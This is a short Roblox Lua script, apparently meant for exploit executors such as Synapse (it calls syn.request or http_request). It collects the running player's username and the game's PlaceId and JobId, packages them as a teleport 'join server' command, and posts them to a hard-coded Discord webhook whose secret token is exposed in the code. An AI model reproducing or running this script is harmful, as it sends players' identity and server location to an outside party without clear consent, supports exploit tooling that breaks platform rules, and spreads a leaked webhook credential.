local Http = game:GetService("HttpService")
local WebhookUrl = "https://discord.com/api/webhooks/1379048133702455396/TmMAJJF_g_04qtJasWYKHI2K0JmX-l01wp_LBGGNCj9wECRli2a3OtIXSW-PSyRgmuHy"

local player = game.Players.LocalPlayer
local userName = player and player.Name or "Unknown"

-- Get the real PlaceId and JobId dynamically
local placeId = tostring(game.PlaceId)
local jobId = tostring(game.JobId)

local function sendRequest()
    local joinScript = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"

    return {
        Url = WebhookUrl,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = Http:JSONEncode({
            content = "**Join Server Script from user: " .. userName .. "**",
            embeds = {{
                title = "Join Server Script",
                description = "```lua\n" .. joinScript .. "\n```",
                color = 0x00FF00
            }}
        })
    }
end

if syn then
    syn.request(sendRequest())
else
    local req = http_request or request or HttpPost or (syn and syn.request)
    if req then
        req(sendRequest())
    else
        warn("No compatible request function found")
    end
end
